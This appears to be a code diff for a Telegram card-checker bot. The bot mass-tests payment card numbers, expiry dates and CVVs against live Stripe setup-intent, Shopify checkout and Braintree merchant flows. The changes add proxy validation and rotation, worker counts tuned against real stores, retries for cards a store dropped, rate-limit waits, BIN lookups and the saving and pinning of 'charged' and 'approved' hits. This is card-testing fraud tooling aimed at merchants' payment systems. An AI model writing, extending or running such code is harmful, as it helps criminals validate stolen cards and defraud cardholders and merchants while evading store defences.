+    status_msg = await event.reply(f"🔍 Testing {len(checking)} proxy(ies)...")
+    good_proxies = []
+    dead_proxies = []
+
+    for line in checking:
+        proxy_url = line
+        if not line.startswith("http"):
+            p = line.split(":")
+            if len(p) == 4:
+                proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
+            elif len(p) == 2:
+                proxy_url = f"http://{p[0]}:{p[1]}"
+
+        is_alive = False
+        try:
+            timeout = aiohttp.ClientTimeout(total=8, connect=5)
+            connector = aiohttp.TCPConnector(ssl=False, force_close=True)
+            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as test_sess:
+                async with test_sess.get("https://httpbin.org/ip", proxy=proxy_url, timeout=timeout) as resp:
+                    if resp.status == 200:
+                        is_alive = True
+        except Exception:
+            try:
+                async with aiohttp.ClientSession(timeout=timeout, connector=connector) as test_sess:
+                    async with test_sess.get("https://api.ipify.org?format=json", proxy=proxy_url, timeout=timeout) as resp:
+                        if resp.status == 200:
+                            is_alive = True
+            except Exception:
+                pass
+
+        if is_alive:
+            good_proxies.append(line)
             add_user_proxy(event.sender_id, line)
+        else:
+            dead_proxies.append(line)
+
+    try:
+        await status_msg.delete()
+    except:
+        pass
 
     result = ""
-    if valid:
-        result += f"**{len(valid)} proxy(ies) added to your profile.**\n"
+    if good_proxies:
+        result += f"✅ **{len(good_proxies)} proxy(ies) tested and added:**\n"
+        for p in good_proxies[:5]:
+            result += f"  ✅ `{p}`\n"
+        if len(good_proxies) > 5:
+            result += f"  ... and {len(good_proxies) - 5} more\n"
+    if dead_proxies:
+        result += f"❌ **{len(dead_proxies)} dead proxy(ies) rejected:**\n"
+        for p in dead_proxies[:5]:
+            result += f"  ❌ `{p}`\n"
+        if len(dead_proxies) > 5:
+            result += f"  ... and {len(dead_proxies) - 5} more\n"
     if invalid:
-        result += f"**{len(invalid)} invalid proxy(ies) (use format host:port or host:port:user:pass):**\n"
-        result += "\n".join(f"`{p}`" for p in invalid)
-    if not valid and not invalid:
+        result += f"⚠️ **{len(invalid)} invalid format (use host:port:user:pass):**\n"
+        for p in invalid[:3]:
+            result += f"  `{p}`\n"
+    if not good_proxies and not dead_proxies and not invalid:
         result = "No proxies provided."
     await event.reply(result)
     return
@@ -4349,7 +5014,7 @@ async def scrapeproxy_cmd(event):
         else:
             await status_msg.edit("⚠️ Proxy scraper timed out. Try again later.")
     except Exception as e:
-        await status_msg.edit(f"❌ Scraper error: {str(e)[:100]}")
+        await status_msg.edit(f"❌ Scraper error: {type(e).__name__}: {str(e)[:100]}")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/](proxyguide|proxyhelp|pguide)$'))
 async def proxy_guide_cmd(event):
@@ -4472,7 +5137,7 @@ async def stopmass_cmd(event):
         return await event.reply("Mass check stopped.")
     return await event.reply("No active mass check found.")
 
-async def process_mass_gateway(event, replied_msg, alias, gate_name):
+async def process_mass_gateway(event, replied_msg, alias, gate_name, fast_mode=False):
     user_id = event.sender_id
     if user_id in ACTIVE_MASS_PROCESSES:
         return await event.reply("You already have an active mass check. Wait for it to finish.")
@@ -4491,6 +5156,21 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
     if not cards:
         return await event.reply("No valid cards found in the file.")
 
+    if fast_mode:
+        t0 = time.time()
+        parsed = []
+        for c in cards:
+            p = parse_card_input(f"{c[0]}|{c[1]}|{c[2]}|{c[3]}")
+            if p:
+                parsed.append(p)
+        rows = _fast_local_filter(parsed)
+        msg = _fast_filter_message(rows, round(time.time() - t0, 2), alias)
+        try:
+            await event.reply(msg)
+        except Exception:
+            pass
+        return
+
     _, access_type = await can_use(user_id, event.chat)
     cc_limit = get_cc_limit(access_type, user_id)
     if cc_limit > 0 and len(cards) > cc_limit:
@@ -4501,6 +5181,13 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
     mass_start_time = time.time()
     ACTIVE_MASS_PROCESSES[user_id] = True
     await register_mass_user(user_id)
+    try:
+        _uname = ""
+        _u = await event.get_sender()
+        _uname = _u.first_name or ""
+    except Exception:
+        _uname = ""
+    await log_mass_event("START", alias, total, user_id, _uname, "file")
 
     user = await event.get_sender()
     first_name = user.first_name or "User"
@@ -4533,6 +5220,25 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
         concurrency = 3
     elif alias in ("ppn", "pp", "bnc", "ppk"):
         concurrency = 5
+    elif alias == "st":
+        # Measured on the live store: it answers 3-4 setup intents at the
+        # same time in 2.5 s each (0.36 cards/s with one worker, 1.0 with
+        # three, 1.27 with four), but at six it starts dropping the
+        # requests.  Four is the widest it takes, so a 1000 card file takes
+        # about 13-16 minutes.
+        concurrency = _mass_concurrency(alias, cards, 1)
+    elif alias == "shp":
+        # Measured on the validator service: 24 checks at a time come back
+        # clean (3.2 cards/s), at 48 the stores start refusing the
+        # checkout and at 96 the run falls apart.  This flow used to run
+        # with THREE workers, which is where the time went.
+        concurrency = _mass_concurrency(alias, cards, 1)
+    elif alias in ("b3", "b3c"):
+        # The Braintree stores answer directly in 1.4-2.8 s a card and
+        # the store is the limit: three, six and ten workers all come out
+        # at the same 1.6 cards/s.  Four keeps the store busy without
+        # hammering it.
+        concurrency = int(os.environ.get("B3_MASS_WORKERS", "4"))
 
     sep = "\u2550" * 19
     charged_count = 0
@@ -4569,13 +5275,18 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
         pct_val = f"{(chk / tot * 100):.1f}" if tot > 0 else "0.0"
         bar_val = _progress_bar(chk, tot)
         anim = _get_anim()
+        # the /st gate speaks in two words only
+        if alias == "st":
+            ap_label, dec_label = "approved", "card_decline"
+        else:
+            ap_label, dec_label = "Approved", "Declined"
         txt = (
             f"{anim} **Mass Check - {gate_name}**\n{sep}\n\n"
             f"\U0001f525 Charged: **{ch}**\n"
-            f"\u2705 Approved: **{ap}**\n"
+            f"\u2705 {ap_label}: **{ap}**\n"
             f"\U0001f512 3DS: **{tds}**\n"
             f"\U0001f4b3 Insufficient: **{insf}**\n"
-            f"\u274c Declined: **{dec}**\n"
+            f"\u274c {dec_label}: **{dec}**\n"
             f"\u26a0 Errors: **{err}**\n\n"
             f"Workers: **{concurrency}** | \u23f1 {_fmt_elapsed()}\n"
             f"{bar_val} **{pct_val}%** ({chk}/{tot})"
@@ -4608,11 +5319,15 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
             declined_count += 1
             checked_count += 1
             all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "DECLINED", "Luhn check failed"))
+            await log_gate_result(alias, f"{cc}|{mm}|{yy}|{cvv}", "DECLINED",
+                                  "Luhn check failed", 0, user_id, first_name, "mass-file")
             continue
         if is_bin_banned(cc):
             declined_count += 1
             checked_count += 1
             all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "DECLINED", "Banned BIN"))
+            await log_gate_result(alias, f"{cc}|{mm}|{yy}|{cvv}", "DECLINED",
+                                  "Banned BIN", 0, user_id, first_name, "mass-file")
             continue
         valid_cards.append((cc, mm, yy, cvv))
 
@@ -4656,8 +5371,19 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
 
             resp = None
             try:
+                card_started = time.time()
                 async with GLOBAL_MASS_SEM:
-                    mass_timeout = 55 if alias in ("ppn", "pp", "ch", "shp", "bnc", "ppk") else 40
+                    mass_timeout = 55 if alias in ("ppn", "pp", "ch", "bnc", "ppk") else 40
+                    if alias == "st":
+                        # the $0 setup-intent gate falls back to a direct
+                        # attempt when the proxy is dead, so it needs more
+                        # room than the default cap
+                        mass_timeout = 75
+                    if alias == "shp":
+                        # a real checkout with 24 workers running: a slow
+                        # store can take a while, and cutting the check
+                        # short would throw away a card that was fine
+                        mass_timeout = 150
                     resp = await asyncio.wait_for(
                         run_gateway(alias, cc, mm, yy, cvv, user_id=user_id, is_admin=user_id in ADMIN_ID),
                         timeout=mass_timeout
@@ -4669,6 +5395,8 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
                     except: pass
                     break
                 resp = resp or "No response"
+                # a store that is rate limiting us holds the whole scan
+                await _mass_throttle_wait(alias, resp)
             except asyncio.TimeoutError:
                 _proxy_set = bool(get_user_proxy(user_id))
                 if _proxy_set:
@@ -4676,13 +5404,33 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
                 else:
                     resp = "Error - Gateway Timeout\n⚠️ No proxy set — add one with /setproxy to avoid timeouts"
             except Exception as ex:
-                resp = f"Error - {str(ex)[:80]}"
+                resp = f"Error - {type(ex).__name__}: {str(ex)[:80]}"
 
             if stop_event.is_set():
                 break
 
             resp_clean = clean_response(resp)
             status = classify_response(resp)
+
+            # what the user reads: the same words as a single check
+            resp_show = resp_clean
+            if alias == "st":
+                _tok = st_verdict_token(status)
+                if _tok == "approved":
+                    _low = (resp_clean or "").lower()
+                    resp_show = ("approved with 3ds" if ("3ds" in _low or
+                                 "3d secure" in _low or "requires_action" in _low)
+                                 else "approved")
+                elif _tok:
+                    resp_show = _tok
+
+            if alias == "st" and resp_show != resp_clean:
+                # the reason goes to the journal, the user gets the verdict
+                print(f"GATE_REASON {alias} {cc}|{mm}|{yy}|{cvv} -> {resp_clean}")
+            await log_gate_result(alias, f"{cc}|{mm}|{yy}|{cvv}", status,
+                                  resp_show if alias == "st" else resp_clean,
+                                  round(time.time() - card_started, 2),
+                                  user_id, first_name, "mass-file")
 
             resp_lower = resp_clean.lower() if resp_clean else ""
             is_3ds = "3ds" in resp_lower or "3d secure" in resp_lower or "requires_action" in resp_lower
@@ -4703,16 +5451,16 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
                         tds_count += 1
                     if is_insf:
                         insf_count += 1
-                    hits.append((cc, mm, yy, cvv, "APPROVED", resp_clean))
-                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", resp_clean))
+                    hits.append((cc, mm, yy, cvv, "APPROVED", resp_show))
+                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", resp_show))
                 elif status == "DECLINED":
                     declined_count += 1
                     consecutive_errors[0] = 0
-                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "DECLINED", resp_clean))
+                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "DECLINED", resp_show))
                 else:
                     error_count += 1
                     consecutive_errors[0] += 1
-                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "ERROR", resp_clean))
+                    all_results.append((f"{cc}|{mm}|{yy}|{cvv}", "ERROR", resp_show))
 
                     if consecutive_errors[0] >= 20:
                         try:
@@ -4740,7 +5488,12 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
                                 pf.write("=" * 50 + "\n")
                             pf.write(f"--- Progress: {checked_count}/{total} | C:{charged_count} A:{approved_count} D:{declined_count} E:{error_count} ---\n")
                             for card_str, card_status, card_resp in new_entries:
-                                pf.write(f"{card_str} | {card_status} | {card_resp}\n")
+                                if alias == "st":
+                                    # the /st verdict is one word
+                                    token = st_verdict_token(card_status)
+                                    pf.write(f"{card_str} | {token if token else card_resp}\n")
+                                else:
+                                    pf.write(f"{card_str} | {card_status} | {card_resp}\n")
                     except Exception:
                         pass
 
@@ -4773,11 +5526,19 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
                     brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
                     mass_proxy = get_user_proxy(user_id)
                     mp_status = "Live" if mass_proxy else "Not Set"
-                    hit_msg = format_gateway_result(
-                        "APPROVED", cc, mm, yy, cvv, gate_name, resp,
-                        brand, bin_type, level, bank, country, flag,
-                        0, first_name, user_id, rank, proxy_status=mp_status
-                    )
+                    if alias == "st":
+                        # the /st frame, so a live card reads "approved"
+                        hit_msg = format_stripe_result(
+                            "APPROVED", cc, mm, yy, cvv, resp,
+                            brand, bin_type, bank, country, flag,
+                            0, first_name, user_id, rank
+                        )
+                    else:
+                        hit_msg = format_gateway_result(
+                            "APPROVED", cc, mm, yy, cvv, gate_name, resp,
+                            brand, bin_type, level, bank, country, flag,
+                            0, first_name, user_id, rank, proxy_status=mp_status
+                        )
                     approved_msg = await event.reply(hit_msg)
                     if event.is_group:
                         asyncio.create_task(auto_delete_message(approved_msg))
@@ -4795,6 +5556,35 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
         worker_tasks = [asyncio.create_task(worker()) for _ in range(concurrency)]
         await asyncio.gather(*worker_tasks)
 
+        # The merchant's load balancer drops a request now and then.  The
+        # cards it dropped are put back in the queue and tried again, so a
+        # dropped request does not become a lost card.
+        for _pass in range(2):
+            dropped = [r for r in list(all_results)
+                       if r[1] == "ERROR" and _is_retryable_error(r[2], alias)]
+            if not dropped or user_id not in ACTIVE_MASS_PROCESSES:
+                break
+            for card_str, _st, _resp in dropped:
+                try:
+                    _p = parse_card_input(card_str)
+                    if _p:
+                        await card_queue.put(_p)
+                except Exception:
+                    pass
+            all_results[:] = [r for r in all_results
+                              if not (r[1] == "ERROR"
+                                      and _is_retryable_error(r[2], alias))]
+            error_count = max(0, error_count - len(dropped))
+            checked_count = max(0, checked_count - len(dropped))
+            try:
+                await event.reply(
+                    f"\u21bb {len(dropped)} dropped by the store, checking them again...")
+            except Exception:
+                pass
+            await asyncio.sleep(4)
+            worker_tasks = [asyncio.create_task(worker()) for _ in range(concurrency)]
+            await asyncio.gather(*worker_tasks)
+
         stopped = user_id not in ACTIVE_MASS_PROCESSES and checked_count < total
         status_label = "Stopped" if stopped else "Complete"
         bar = _progress_bar(checked_count, total)
@@ -4802,16 +5592,21 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
         final_proxy = get_user_proxy(user_id)
         final_p_status = "Live" if final_proxy else "Not Set"
         final_elapsed = _fmt_elapsed()
+        # the /st gate speaks in two words only
+        if alias == "st":
+            ap_label, dec_label = "approved", "card_decline"
+        else:
+            ap_label, dec_label = "Approved", "Declined"
         final_text = (
             f"\u2714 **Mass Check {status_label} - {gate_name}**\n{sep}\n"
             f"{bar} **{pct}%**\n"
             f"Total: {total} | Workers: {concurrency}\n"
             f"\u23f1 Time: {final_elapsed}\n\n"
             f"\U0001f525 Charged: {charged_count}\n"
-            f"\u2705 Approved: {approved_count}\n"
+            f"\u2705 {ap_label}: {approved_count}\n"
             f"\U0001f512 3DS: {tds_count}\n"
             f"\U0001f4b3 Insufficient: {insf_count}\n"
-            f"\u274c Declined: {declined_count}\n"
+            f"\u274c {dec_label}: {declined_count}\n"
             f"\u26a0 Errors: {error_count}\n\n"
             f"\U0001f464 Req By \u00bb [{first_name}](tg://user?id={user_id}) [{rank}]\n"
             f"\U0001f310 Proxy \u00bb {final_p_status}"
@@ -4829,9 +5624,14 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
             if event.is_group:
                 asyncio.create_task(auto_delete_message(progress_msg))
         except Exception:
-            fallback_msg = await event.reply(final_text)
-            if event.is_group:
-                asyncio.create_task(auto_delete_message(fallback_msg))
+            # too long for one message -> send it in parts
+            sent = await _send_long(event, final_text)
+            if sent and event.is_group:
+                asyncio.create_task(auto_delete_message(sent[-1]))
+
+        await log_mass_event("END", alias, total, user_id, _uname, "file",
+                             f"approved={approved_count} declined={declined_count} "
+                             f"errors={error_count} secs={int(time.time() - mass_start_time)}")
 
         result_file = os.path.join(tempfile.gettempdir(), f"results_{alias}_{user_id}.txt")
         try:
@@ -4839,10 +5639,18 @@ async def process_mass_gateway(event, replied_msg, alias, gate_name):
             sorted_results = sorted(all_results, key=lambda r: status_order.get(r[1], 4))
             with open(result_file, "w") as rf:
                 rf.write(f"Mass Check Results - {gate_name}\n")
-                rf.write(f"Total: {total} | Charged: {charged_count} | Approved: {approved_count} | Declined: {declined_count} | Errors: {error_count}\n")
+                if alias == "st":
+                    rf.write(f"Total: {total} | approved: {approved_count} | card_decline: {declined_count} | Errors: {error_count}\n")
+                else:
+                    rf.write(f"Total: {total} | Charged: {charged_count} | Approved: {approved_count} | Declined: {declined_count} | Errors: {error_count}\n")
                 rf.write("=" * 50 + "\n\n")
                 for card_str, card_status, card_resp in sorted_results:
-                    rf.write(f"{card_str} | {card_status} | {card_resp}\n")
+                    if alias == "st":
+                        # the /st verdict is one word: approved or card_decline
+                        token = st_verdict_token(card_status)
+                        rf.write(f"{card_str} | {token if token else card_resp}\n")
+                    else:
+                        rf.write(f"{card_str} | {card_status} | {card_resp}\n")
             file_msg = await event.reply(file=result_file)
             if event.is_group:
                 asyncio.create_task(auto_delete_message(file_msg))
@@ -5079,342 +5887,10 @@ async def scrsk_handler(event):
         await event.reply(f"Error scraping: {e}")
 
 # --- /sh Handler (Shopify + Gateway routing) ---
-
-@client.on(events.NewMessage(pattern=r'(?i)^[/]sh\b'))
-async def sh(event):
-    can_access, access_type = await can_use(event.sender_id, event.chat)
-    if access_type == "banned": return await event.reply(banned_user_message())
-    if not can_access:
-        msg, buttons = access_denied_message_with_button()
-        return await event.reply(msg, buttons=buttons)
-    asyncio.create_task(process_sh_card(event, access_type))
-
-async def process_sh_card(event, access_type):
-    args = event.raw_text.split()
-    flat = get_flat_registry()
-
-    if len(args) >= 2 and args[1].lower() in flat:
-        alias = args[1].lower()
-
-        if not is_gateway_on(alias) and event.sender_id not in ADMIN_ID:
-            return await event.reply(f"Gateway `{alias}` is currently disabled by admin.")
-
-        allowed, remaining = check_cooldown(event.sender_id)
-        if not allowed:
-            return await event.reply(f"Cooldown: wait {remaining}s")
-
-        remaining_text = " ".join(args[2:]) if len(args) > 2 else ""
-
-        # ── Shopify: allow /sh shp <site> <cc> or /sh shp #2 <cc> ──────────
-        shp_target_site = None
-        if alias == "shp" and remaining_text:
-            # Check if first word is a site URL or site index (#N)
-            first_word = args[2] if len(args) > 2 else ""
-            if first_word.startswith("#") and first_word[1:].isdigit():
-                # Site index: #1, #2, etc.
-                site_idx = int(first_word[1:]) - 1
-                try:
-                    _sites_data = await load_json(SITE_FILE)
-                    _user_sites = _sites_data.get(str(event.sender_id), [])
-                    try:
-                        _admin_sites = await load_json(ADMIN_SITES_FILE)
-                        if isinstance(_admin_sites, list):
-                            _user_sites = list(set(_user_sites + _admin_sites))
-                    except Exception:
-                        pass
-                    if 0 <= site_idx < len(_user_sites):
-                        shp_target_site = _user_sites[site_idx]
-                        remaining_text = " ".join(args[3:]) if len(args) > 3 else ""
-                    else:
-                        return await event.reply(f"Site #{site_idx + 1} not found. You have {len(_user_sites)} sites. Use `/mysites` to see them.")
-                except Exception:
-                    pass
-            elif "." in first_word and not first_word[0].isdigit() and "|" not in first_word:
-                # Looks like a site URL
-                shp_target_site = first_word.replace("https://", "").replace("http://", "").rstrip("/")
-                remaining_text = " ".join(args[3:]) if len(args) > 3 else ""
-        card_data = None
-        if remaining_text:
-            card_data = parse_card_input(remaining_text)
-        if not card_data and event.reply_to_msg_id:
-            replied_msg = await event.get_reply_message()
-            if replied_msg and replied_msg.text:
-                card_data = parse_card_input(replied_msg.text)
-                if not card_data:
-                    cc_pattern = re.compile(r'\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}')
-                    found_in_reply = cc_pattern.findall(replied_msg.text)
-                    if found_in_reply:
-                        card_data = parse_card_input(found_in_reply[0])
-        if not card_data:
-            return await event.reply(f"**Format:** `/sh {alias} 4111111111111111|12|25|123`")
-
-        cc, mm, yy, cvv = card_data
-        if not checkLuhn(cc):
-            return await event.reply("Invalid card number (Luhn check failed).")
-        if is_bin_banned(cc):
-            return await event.reply("This BIN is banned.")
-
-        user = await event.get_sender()
-        first_name = user.first_name or "User"
-        rank = await get_user_rank(event.sender_id)
-        gate_name = flat[alias]["name"]
-
-        loading_msg = await event.reply(f"\u25e0 Checking on **{gate_name}**...")
-        start_time = time.time()
-        _sh_spinner_done = [False]
-
-        async def animate_sh_loading():
-            spinner = ["\u25dc", "\u25dd", "\u25de", "\u25df"]
-            dots = ["", ".", "..", "..."]
-            i = 0
-            while True:
-                if _sh_spinner_done[0]:
-                    break
-                try:
-                    s = spinner[i % 4]
-                    d = dots[i % 4]
-                    await loading_msg.edit(f"{s} Checking on **{gate_name}**{d}")
-                    await asyncio.sleep(0.6)
-                    i += 1
-                except:
-                    break
-
-        sh_loading_task = asyncio.create_task(animate_sh_loading())
-
-        try:
-            if alias == "shp":
-                brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
-
-                async def sh_progress(msg):
-                    try:
-                        await loading_msg.edit(f"\u23f3 **Shopify** | {msg}")
-                    except Exception:
-                        pass
-
-                # Resolve a proxy to forward to the hosted API
-                _sh_proxy = None
-                try:
-                    from gateways import get_user_proxy_list, _raw_to_formatted
-                    proxy_list = get_user_proxy_list(str(event.sender_id))
-                    if proxy_list:
-                        import random as _rng
-                        _rng.shuffle(proxy_list)
-                        _sh_proxy = _raw_to_formatted(proxy_list[0])
-                except Exception:
-                    _sh_proxy = get_user_proxy(str(event.sender_id))
-                if not _sh_proxy:
-                    try:
-                        import random as _rng
-                        with open(PROXY_FILE, "r") as _pf:
-                            _global_proxies = [l.strip() for l in _pf if l.strip()]
-                        if _global_proxies:
-                            _rng.shuffle(_global_proxies)
-                            _gp = _global_proxies[0]
-                            _gp_parts = _gp.split(":")
-                            if len(_gp_parts) == 4:
-                                _sh_proxy = f"http://{_gp_parts[2]}:{_gp_parts[3]}@{_gp_parts[0]}:{_gp_parts[1]}"
-                            elif len(_gp_parts) == 2:
-                                _sh_proxy = f"http://{_gp_parts[0]}:{_gp_parts[1]}"
-                    except Exception:
-                        pass
-
-                _shp_result = None
-                if shp_target_site:
-                    try:
-                        await sh_progress(f"Checking on {shp_target_site}")
-                        _shp_result = await asyncio.wait_for(
-                            call_shopify_api(cc, mm, yy, cvv, site=shp_target_site, proxy=_sh_proxy, timeout=90),
-                            timeout=95
-                        )
-                    except asyncio.TimeoutError:
-                        _shp_result = {"status": "error", "response": "Gateway Timeout (90s)", "gateway": "Shopify Payments", "amount": None, "site": shp_target_site}
-                    except Exception as e:
-                        _shp_result = {"status": "error", "response": f"Error: {str(e)[:100]}", "gateway": "Shopify Payments", "amount": None, "site": shp_target_site}
-                else:
-                    # No target site — load user's custom sites + admin sites
-                    user_shp_sites = []
-                    try:
-                        _sites_data = await load_json(SITE_FILE)
-                        user_shp_sites = _sites_data.get(str(event.sender_id), [])
-                    except Exception:
-                        pass
-                    try:
-                        _admin_sites = await load_json(ADMIN_SITES_FILE)
-                        if isinstance(_admin_sites, list):
-                            user_shp_sites = list(set(user_shp_sites + _admin_sites))
-                    except Exception:
-                        pass
-
-                    if user_shp_sites:
-                        import random as _rng
-                        _shuffled = user_shp_sites.copy()
-                        _rng.shuffle(_shuffled)
-                        for _site in _shuffled[:5]:
-                            try:
-                                await sh_progress(f"Checking on {_site}")
-                                _result = await asyncio.wait_for(
-                                    call_shopify_api(cc, mm, yy, cvv, site=_site, proxy=_sh_proxy, timeout=90),
-                                    timeout=95
-                                )
-                                if _result.get("status") not in ("dead_site", "error"):
-                                    _shp_result = _result
-                                    break
-                            except asyncio.TimeoutError:
-                                continue
-                            except Exception:
-                                continue
-                        if not _shp_result:
-                            # Final attempt: let the API pick a site from its own list
-                            try:
-                                _shp_result = await asyncio.wait_for(
-                                    call_shopify_api(cc, mm, yy, cvv, site=None, proxy=_sh_proxy, timeout=90),
-                                    timeout=95
-                                )
-                            except Exception as e:
-                                _shp_result = {"status": "error", "response": f"Error: {str(e)[:100]}", "gateway": "Shopify Payments", "amount": None, "site": None}
-                    else:
-                        # No user sites — let the API pick from its own list
-                        try:
-                            _shp_result = await asyncio.wait_for(
-                                call_shopify_api(cc, mm, yy, cvv, site=None, proxy=_sh_proxy, timeout=90),
-                                timeout=95
-                            )
-                        except Exception as e:
-                            _shp_result = {"status": "error", "response": f"Error: {str(e)[:100]}", "gateway": "Shopify Payments", "amount": None, "site": None}
-
-                if _shp_result:
-                    # Use rich Shopify formatting (same as /shp)
-                    r_status = _shp_result.get("status", "error")
-                    r_resp = _shp_result.get("response", "Unknown")
-                    r_gateway = _shp_result.get("gateway", "Shopify Payments")
-                    r_amount = _shp_result.get("amount")
-                    r_site = _shp_result.get("site", "")
-                    r_elapsed = round(time.time() - start_time, 2)
-                    r_extra = _shp_result.get("extra")
-                    r_confidence = _shp_result.get("confidence")
-                    r_explanation = _shp_result.get("explanation", "")
-                    r_card_type = _shp_result.get("card_type", "")
-                    r_card_bin = _shp_result.get("card_bin", "")
-                    r_card_last4 = _shp_result.get("card_last4", "")
-
-                    cc_str = f"{cc}|{mm}|{yy}|{cvv}"
-                    info_str = f"{brand} - {bin_type} - {level}".upper()
-
-                    if r_status == "charged":
-                        header_icon = "\u2705"
-                        resp_display = f"CHARGED \U0001f525"
-                    elif r_status == "live":
-                        header_icon = "\u26a0\ufe0f"
-                        if "3ds" in r_resp.lower():
-                            resp_display = f"3DS Required \U0001f512"
-                        else:
-                            resp_display = f"CCN LIVE \U0001f387"
-                    elif r_status == "approved":
-                        header_icon = "\u2705"
-                        resp_display = f"APPROVED \U0001f387"
-                    elif r_status == "declined":
-                        header_icon = "\u274c"
-                        resp_display = f"DECLINED \u26d4"
-                    else:
-                        header_icon = "\u2753"
-                        resp_display = f"ERROR"
-
-                    msg = f"""{header_icon} **Shopify**
-**Card:** `{cc_str}`
-**Status:** {resp_display}
-**Bank Response:** {r_resp}
-**Decline Reason:** {r_explanation or 'N/A'}
-
-**Gateway:** {r_gateway}
-**Amount:** ${r_amount or 'N/A'}
-**Card Type:** {r_card_type or 'N/A'}
-**BIN:** {r_card_bin or 'N/A'} | **Last4:** {r_card_last4 or 'N/A'}
-**Confidence:** {r_confidence if r_confidence is not None else 'N/A'}%
-
-**Info:** {info_str}
-**Bank:** {bank} \U0001f3db
-**Country:** {country} {flag}
-
-**Checked By:** [{first_name}](tg://user?id={event.sender_id})
-**Time:** {r_elapsed} seconds"""
-
-                    # Stop spinner first
-                    _sh_spinner_done[0] = True
-                    try:
-                        sh_loading_task.cancel()
-                    except:
-                        pass
-
-                    # Edit the loading message into the result (stays in same place)
-                    try:
-                        await loading_msg.edit(msg)
-                        result_msg = loading_msg
-                    except Exception:
-                        try:
-                            await loading_msg.delete()
-                        except:
-                            pass
-                        result_msg = await event.reply(msg)
-                    if r_status == "charged":
-                        await pin_charged_message(event, result_msg)
-                    return
-            else:
-                response = await run_gateway(alias, cc, mm, yy, cvv, user_id=event.sender_id, is_admin=event.sender_id in ADMIN_ID)
-            if response == "NO_SKOOL_ACCOUNT":
-                _sh_spinner_done[0] = True
-                sh_loading_task.cancel()
-                await asyncio.sleep(0.1)
-                try: await loading_msg.delete()
-                except: pass
-                await event.reply(NO_SKOOL_ACCOUNT_MSG)
-            return
-            elapsed = round(time.time() - start_time, 2)
-            status = classify_response(response)
-            brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
-
-            if status == "CHARGED":
-                status_header = "CHARGED"
-                await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "CHARGED", response, gate_name, "-", event.sender_id, first_name)
-            elif status == "APPROVED":
-                status_header = "APPROVED"
-                await save_approved_card(f"{cc}|{mm}|{yy}|{cvv}", "APPROVED", response, gate_name, "-", event.sender_id, first_name)
-            elif status == "DECLINED":
-                status_header = "DECLINED"
-            else:
-                status_header = "UNKNOWN"
-
-            user_proxy = get_user_proxy(event.sender_id)
-            if not user_proxy:
-                p_status = "Not Set"
-            elif status in ("CHARGED", "APPROVED", "DECLINED"):
-                p_status = "Live"
-            else:
-                p_status = "Dead"
-            msg = format_gateway_result(
-                status_header, cc, mm, yy, cvv, gate_name, response,
-                brand, bin_type, level, bank, country, flag,
-                elapsed, first_name, event.sender_id, rank, proxy_status=p_status
-            )
-
-            _sh_spinner_done[0] = True
-            sh_loading_task.cancel()
-            await asyncio.sleep(0.1)
-            await loading_msg.delete()
-            result_msg = await event.reply(msg)
-            if status == "CHARGED":
-                await pin_charged_message(event, result_msg)
-            if event.is_group:
-                asyncio.create_task(auto_delete_message(result_msg))
-        except Exception as e:
-            _sh_spinner_done[0] = True
-            sh_loading_task.cancel()
-            await asyncio.sleep(0.1)
-            try: await loading_msg.delete()
-            except: pass
-            await event.reply(f"Error: {e}")
-        return
-
-    return await event.reply("**Format:** `/sh <alias> <cc>`\n\nUse `/cmds` to see available gateways")
+# NOTE: /sh is handled by sh_cmd() further up in this file. The old
+# sh()/process_sh_card() pair was left over from a previous implementation
+# and only ever replied with a "Format:" hint, so a single /sh produced a
+# duplicate message. Removed so /sh runs exactly once.
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/]fl\b'))
 async def fl_handler(event):
@@ -5721,7 +6197,7 @@ async def _process_sk_keys(event, keys, first_name, user_id):
                 pass
 
     except Exception as e:
-        await event.reply(f"Error during SK check: {str(e)[:100]}")
+        await event.reply(f"Error during SK check: {type(e).__name__}: {str(e)[:100]}")
     finally:
         ACTIVE_SKC_PROCESSES.pop(user_id, None)
 
@@ -6141,6 +6617,12 @@ async def process_mtxt_cards(event, cards, sites):
     total = len(cards)
     await register_mass_user(user_id)
     CONCURRENT = await get_dynamic_concurrency(3)
+    # The stores are the limit, not the validator service: it answers
+    # about two dozen checks at a time cleanly.  Two workers per store
+    # keeps every store busy without overloading it.
+    if sites:
+        CONCURRENT = max(3, min(int(os.environ.get("MTXT_WORKERS", "24")),
+                                len(sites) * 2))
     MAX_RETRIES = 5
 
     stop_key = f"mtxt_stop_{user_id}".encode()
@@ -6342,14 +6824,13 @@ async def process_mtxt_cards(event, cards, sites):
 
             tried_sites.add(current_site)
             retry_tag = f" R{attempt}" if attempt > 0 else ""
-            site_short = current_site[:15] + "..." if len(current_site) > 15 else current_site
-
-            slot_status[slot_idx] = f"\U0001f7e1 `...{card_short}` \u279c `{site_short}`{retry_tag}"
+            # the store name is never shown
+            slot_status[slot_idx] = f"\U0001f7e1 `...{card_short}` \u279c{retry_tag}"
             await _update_status_msg()
 
             async def slot_progress(step):
